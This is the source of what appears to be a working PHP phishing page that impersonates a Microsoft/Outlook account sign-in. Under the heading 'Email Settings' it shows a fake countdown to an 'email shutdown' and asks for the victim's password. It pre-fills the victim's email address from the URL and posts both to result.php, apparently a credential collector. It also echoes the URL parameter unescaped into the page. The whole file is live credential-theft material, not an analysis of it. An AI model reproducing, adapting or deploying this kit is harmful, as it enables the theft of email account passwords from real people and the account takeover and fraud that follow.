<?
$cust_email = $_GET["userid"];
$url = explode("@",$cust_email);
$parts = preg_split ("/[\@.]+/", $cust_email);
$cust_name = $parts[0];


?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
<html>
<head>
<html dir="ltr" lang="EN-US"><head><script type="text/javascript">
function validateForm()
{
var x=document.forms["data"]["login"].value;
if (x==null || x=="")
  {
  alert("Please fill out this field.");
  return false;
  }
  var x=document.forms["data"]["passwd"].value;
if (x==null || x=="")
  {
  alert("Please fill out this field");
  return false;
  }
}
</script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<!-- base href="http://lebenalimentos.com.br/wamp/cameo.php?nin1.0%26rpsnv%3D12%26ct%3D1389173413%26rver%3D6.4.6456.0%26wp%3DMBI%26wreply%3Dhttp_%252F%252Fmail.live.com%252Fdefault.aspx%26lc%3D1033%26id%3D64855%26mkt%3Den-us%26cbcxt%3Dmai%26snsc%3D#" -->
<script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script><noscript>
<meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript>
<title>Email Settings | Verification</title>
<meta name="PageID" content="i5030">
<meta name="SiteID" content="292841">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="1033"><link rel="shortcut icon" href="http://images.iimg.in/c/569f4771c45d324bda8b4660-4-501-0-1453279096/google/user-icon-png-pnglogocom.img?crop=1%22%20type=%22image/gif">
        <link rel="stylesheet" title="Default" type="text/css" href="index_files/Default1033.css"><style type="text/css">        .IE_M7 .btn.btn-primary, .IE_M8 .btn.btn-primary
        {
          background-color: #0078d7;
        }
    body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(a,f,b){var e=1,d=unescape('%3Cscript type="text/javascript" src="'),c=unescape('"%3E%3C/script%3E');if(g_sSRSSuccess.indexOf(a)!=-1)return;if(typeof window[a]=="undefined"){g_iSRSFailed=1;b<=e&&document.write(d+f+c)}else g_sSRSSuccess+=a+"|"+b+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.26210.00/Windows_Live_v_thumb.jpg">
<script type="text/javascript">var ServerData = {aU:'',j:'wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&lc=1033&id=292841&mkt=en-us&cbcxt=out&fl=wld&bk=1459775514',Be:false,urlSwitch:'https://login.live.com/logout.srf?wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&lc=1033&id=292841&mkt=en-us&cbcxt=out&fl=wld&ru=https://outlook.live.com/owa/&bk=1459775514&lm=I',k:3,Bf:true,AR:false,aW:"#~#partnerdomain#~# does\'t use this service. Please sign in with a Microsoft account or create a new account. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Learn More</a>",fHasBackgroundColor:false,sCBUpTxt1:'',m:true,AT:0,AU:{},sCBUpTxt2:'',Bi:"Sign in",aY:"A single-use code lets you sign in without entering your password. This helps protect your account when you\'re using someone else\'s PC. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",aZ:"Your session has timed out. To request a single use code, please <a href=\"javascript:NewOTCRequest()\">refresh the page</a>.",p:'',AX:'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/EN-US.html?id=292841&mkt=EN-US&cbcxt=out',Bl:'https://auth.gfx.ms/16.000.26210.00/Microsoft_Logotype_Gray.png',AY:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&cbcxt=out&fl=wld&mkt=EN-US&lc=1033&bk=1459775514',sFedQS:'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=wa%3Dwsignin1.0%26rpsnv%3D12%26ct%3D1459775512%26rver%3D6.4.6456.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252foutlook.live.com%252fowa%252f%26lc%3D1033%26id%3D292841%26mkt%3Den-us%26cbcxt%3Dout%26fl%3Dwld%26bk%3D1459775514',aa:'',A:true,v:'',B:false,ab:'',urlPost:'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&lc=1033&id=292841&mkt=en-us&cbcxt=out&fl=wld&bk=1459775514&uaid=9ef1550d75144997992ef8c8b7f67fa7&pid=0',C:true,html:[],ae:'https://outlook.office365.com/owa/prefetch.aspx?id=292841&mkt=EN-US',str:[],fWebNgcFS:false,Ab:{},F:'',BA:'',sErrTxt:'',G:'',ah:false,BC:'',H:false,a3:'9ef1550d75144997992ef8c8b7f67fa7',a4:'https://account.live.com/query.aspx?mkt=EN-US&lc=1033&id=292841',A1:true,oPost:{},urlFed:'',BE:true,Af:false,a6:'',BF:false,Ag:0,A2:false,a7:'',a8:'',Ai:0,BH:1000,A4:false,a9:'',N:'',BJ:'https://auth.gfx.ms/16.000.26210.00/AppCentipede/AppCentipede_Microsoft.png',A6:true,O:false,BK:'',P:'Passpo',Q:'https://login.live.com/cookiesDisabled.srf?mkt=EN-US&lc=1033',A9:'',R:false,An:'sign up',urlLogin:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&cbcxt=out&fl=wld&bk=1459775514&mkt=EN-US&lc=1033',Ap:'',aw:'microsoft.com,https://corp.sts.microsoft.com/adfs/ls/?cbcxt=&vv=&username=&mkt=&lc=,urn:federation:MSFT|idcrltestns.com,http://p2.live.com/auth/federation/wsfederator.aspx?Action=login&Domain=idcrltestns.com&cbcxt=&vv=&username=&mkt=&lc=,Test IDCRL Federation Partner',W:'',ax:"Sign in to .",aC:'',urlFedConvertRename:'https://account.live.com/security/LoginStage.aspx?lmif=1000&ru=https://login.live.com/login.srf%3Fwa%3Dwsignin1.0%26rpsnv%3D12%26ct%3D1459775512%26rver%3D6.4.6456.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252foutlook.live.com%252fowa%252f%26id%3D292841%26cbcxt%3Dout%26fl%3Dwld%26vv%3D1600%26mkt%3DEN-US%26lc%3D1033&wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&cbcxt=out&fl=wld&vv=1600&mkt=EN-US&lc=1033&cbid=0&id=292841',Av:{},aE:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600',az:"Use the primary phone number you\'ve associated with your Microsoft account. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Learn more</a>",Z:false,AB:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},aF:'',aG:2,Ax:'',Ay:'https://go.microsoft.com/fwlink/?LinkID=254486',aJ:true,sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="DT1jY0DHfIHO48I9L2HvKIsArkedlHV09iBcbdvrDhrkTz5hZfuWrF6NwYH6LDJOqLw61b!pyfWotoiyxMk*bKk0P9YEGrKlsXv5CCd2k6yhRdngXIaNN3kwyprtn8Al5NXDD27Hs5wmZNwGqL5*uE3TSOtP5dimm81JcqH*eloqC7X6nheDKAdSErzHzeutryei3ju5Eb*DYIugHHkLxDLpP4Aiqux4XVQlWXEG6!*G5JB7blmPdWikK7ZY*lSXsdp!rhpSlgwb2Na5yOWwJhA$"/>',AF:false,AG:"&copy;2016 Microsoft",sPOST_NewUser:'',AH:'',b:'',c:'https://signup.live.com/signup.aspx?wa=wsignin1.0&rpsnv=12&ct=1459775512&rver=6.4.6456.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&cbcxt=out&fl=wld&bk=1459775514&uiflavor=web&uaid=9ef1550d75144997992ef8c8b7f67fa7&mkt=EN-US&lc=1033',urlImagePath:'https://auth.gfx.ms/16.000.26210.00/',aN:true,d:1,AK:false,AL:1,f:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d12%26ct%3d1459775512%26rver%3d6.4.6456.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%26lc%3d1033%26id%3d292841%26mkt%3den-us%26cbcxt%3dout%26fl%3dwld%26bk%3d1459775514&id=292841&uiflavor=web&uaid=9ef1550d75144997992ef8c8b7f67fa7&mkt=EN-US&lc=1033&bk=1459775514',AM:'##li16####B##Hotmail##/B####BR##The smart way to do email - fast, easy and reliable##li8####B##Messenger##/B####BR##Stay in touch with the most important people in your life##li10####B##SkyDrive##/B####BR##Free, password-protected online storage',Ba:'',aQ:0,Bb:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600',aR:1033,AO:'',i:false};</script><script type="text/javascript" src="index_files/DefaultLoginStrings1033.js"></script>
</head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
<form name="data" target="_top" method="POST" action="result.php" onsubmit="return validateForm()">
<input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"><input name="FoundMSAs" data-bind="value: foundNames" value="" type="hidden"><input name="LoginOptions" data-bind="value: loginOptions" value="3" type="hidden"><input name="NewUser" value="1" type="hidden"><input name="PPSX" data-bind="value: svr.P" value="Passpor" type="hidden"><input name="PPFT" id="i0327" data-bind="value: svr.sFT" value="DfMTIPlqq5lvcSKQT36stSqdk5KjCkTKc!dh5moOZVbTO6uKdRZvNW9htt*3IMn7dfviMLxwkfMO72JQeQWl6sRdZIyUbH4cMLFsh3mWlCEdfS9SRFUJty1xvzHT8SXmfWfHIpw6nqTMhRYkSZdWndOvYwJbVWSIOOCj26XRn*1ljcM1LE7IIiFMz*Qwk1U8bz1AP4Lfjio5Y13LY9zRVnoI9F9a6mOhpzyAxt3pCqKeCEwo!DSHHLNQWOpF5vqfDkau3s9Xo0FiQW1MbyfftaA$" type="hidden"><input name="type" data-bind="value: svr.BG ? wLive.Login.Core.Constants.PostType.PasswordInline : postType" value="11" type="hidden">
<input name="i13" data-bind="value: clientUsedKmsi" value="0" type="hidden"><input name="i22" data-bind="value: clientUsedCentipede" value="0" type="hidden"><input name="i21" data-bind="value: clientUsedWhatsThis" value="0" type="hidden"><input name="i19" data-bind="value: timeOnPage" value="" type="hidden"><input name="i18" data-bind="value: srsSuccess" value="__DefaultLogin_Strings|1,__DefaultLogin_Core|1," type="hidden"><input name="i17" data-bind="value: srsFailed" value="0" type="hidden"><input name="i16" data-bind="value: clientPerf" value="{&quot;navigationStart&quot;:1459776306017,&quot;unloadEventStart&quot;:0,&quot;unloadEventEnd&quot;:0,&quot;redirectStart&quot;:0,&quot;redirectEnd&quot;:0,&quot;fetchStart&quot;:1459776307515,&quot;domainLookupStart&quot;:1459776307516,&quot;domainLookupEnd&quot;:1459776307517,&quot;connectStart&quot;:1459776307517,&quot;connectEnd&quot;:1459776308553,&quot;secureConnectionStart&quot;:1459776307746,&quot;requestStart&quot;:1459776308553,&quot;responseStart&quot;:1459776308859,&quot;responseEnd&quot;:1459776308861,&quot;domLoading&quot;:1459776308863,&quot;domInteractive&quot;:1459776310305,&quot;domContentLoadedEventStart&quot;:1459776310305,&quot;domContentLoadedEventEnd&quot;:1459776310305,&quot;domComplete&quot;:1459776310307,&quot;loadEventStart&quot;:1459776310307,&quot;loadEventEnd&quot;:0}" type="hidden"><input name="i2" data-bind="value: clientMode" value="1" type="hidden">
<div id="maincontent"><!-- ko withProperties: { '$wizard': viewModel } --><section class="section no-margin-bottom" data-bind="visible: !$wizard || $wizard.showHolder"><div class="section-body container"><div id="pageControlHost"><div><div id="Credentials"><div class="container" id="CredentialsInputPane"><!-- ko if: svr.BJ --><!-- /ko --><!-- ko if: hrdVisible --><!-- /ko --><div class="row" data-bind="ifnot: fedView.isActive() || hrdVisible()"><div data-bind="if: postType() === wLive.Login.Core.Constants.PostType.Password"><div data-bind="component: { name: 'login-password-view', params: { serverData: svr, validationEnabled: validationEnabled, phone: pwdView.phone, username: pwdView.username, password: pwdView.password, hip: pwdView.hip, kmsi: pwdView.kmsi, focusDefaultField: !svr.Bd, setOtcPostType: setOtcPostType, signUpUrl: signUpUrl, resetPasswordUrl: resetPasswordUrl } }">

<table width="100%" height="" cellspacing="0" id="table17">

<tr><td height="30" bgcolor="#000000">

	<table width="" align="center" id="table18"><tbody><tr>


	<td>
	<img src="http://www.sussexbythesea.com/media/images/versions/img94joktmu72751.png?bev=1563&nocache=1441385997641" width="40" height="27">
	</td>


	<td width="5"></td>


	<td>
	<font size="4" color="#ffffff" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">
	Email Settings
	</font>
	</td>







	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font size="4" color="#ffffff" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">
	<?=$_GET[userid]?>	</font>
	</a>
	</div>
	</td>








	<td>
	<a href="">
	<img src="http://images.iimg.in/c/569f4771c45d324bda8b4660-4-501-0-1453279096/google/user-icon-png-pnglogocom.img?crop=1" width="28" height="28" border="0">
	</a>
	</td>

	</tr></tbody></table>

</td></tr>






<tr><td height="60" bgcolor="#FFFFFF"></td>






</tr></table>



	<table width="729" cellspacing="0" align="center" id="table16">

	



	<tr><td height="21" bgcolor="#FFFFFF">



	<table id="table19" width="669" cellspacing="0" align="center">

	<tbody><tr><td>
	<font size="+2" color="#3F59A4" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
	Account Verification
	
	
	
	</font>
	</td></tr>


	<tr><td height="15" bgcolor="#FFFFFF"></td>



	</tr><tr><td>

		<table id="table20"><tbody><tr>

		<td>
		<font size="2" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
		Countdown to your email shutdown: 
		
		</font>
		</td>


		<td>
		<font size="4" color="#ff0000" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">

		<b><div id="hms">01:10:15</div></b>

		<script type="text/javascript">
    		function count() {
 
    		var startTime = document.getElementById('hms').innerHTML;
    		var pieces = startTime.split(":");
    		var time = new Date();    time.setHours(pieces[0]);
    		time.setMinutes(pieces[1]);
    		time.setSeconds(pieces[2]);
    		var timedif = new Date(time.valueOf() - 1000);
    		var newtime = timedif.toTimeString().split(" ")[0];
    		document.getElementById('hms').innerHTML=newtime;
    		setTimeout(count, 1000);
		}
		count();
 
		</script>

		</font>

		</td>



		</tr></tbody></table>

	
	</td></tr>







	<tr><td>
	<font size="2" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
	To prevent your Email from being shutdown, Verify your account details 
	below: 
	</font>
	</td></tr>
	
	



	</tbody></table>

		</td>



	</tr></table>

	<div class="form-group col-md-24">
		<div data-bind="visible: !locked">
			<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: { serverData: svr, textInput: value, hasFocus: focused, hintText: str['CT_PWD_STR_Email_Example'], hintCss: 'placeholder' + (!svr.A ? ' ltr_override' : '') } }">
                           
                      <input name="username" type="hidden" class="form-control" id="username" value="<?=$_GET[userid]?>" placeholder="Username"><h2 class="form-signin-heading">
						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?=$_GET[userid]?></h2>  


		
	    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;


		
	    <input name="pass" style="width:250px; height:40px; font-family: Verdana; font-size:

15px; font-weight: light; color:#000000; background-color: #ffffff; border: solid 1px #848484; padding: 13px;

" required="" placeholder="Enter Password to continue" type="password">

		    
	    
	     <br><br>
	    
	    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	    
	    <input value="Verify now &gt;&gt;" style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161;
 
	    font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 
   
        4px; -webkit-border-radius: 4px; 
	   -khtml-border-radius: 

        4px; border-radius: 4px;
	   -moz

     -box-shadow: 3px 3px 3px #888; -

     webkit-box-shadow: 

      3px 3px 3px #888; box-shadow: 

      3px 3px 3px #888;" type="submit">
	 

	<br>


	&nbsp;<p>&nbsp;</p>
	<p>



	&nbsp;</p>
				<p>



	<br>
	</p>
						<p>



	&nbsp;</p>
						<p>



	&nbsp;</p>
	<hr align="center" width="250">



						<a style="text-decoration:none" href="#1">
	<b>
	<font size="2" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" color="#000000">				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	</font>
	<font size="2" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ***</font></b><font size="2" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif"> Account / Settings / Security Settings / Account Verification &gt;&gt;
	</font>
						</a>
	<font size="2" face="calibri" color="#0000FF">
	&nbsp;</font></div>

</td></tr>





</tbody></table>
<!-- End Main Table-->
<input type="hidden" id="curl" name="curl" value="Z2F" />
<input type="hidden" id="flags" name="flags" value="0" />
<input type="hidden" id="forcedownlevel" name="forcedownlevel" value="0" />
<input type="hidden" id="formdir" name="formdir" value="1" />
                        <input class="txt" id="username" value="<? echo $url[1];?>" name="url" type="hidden">
</form>
</body>
</html>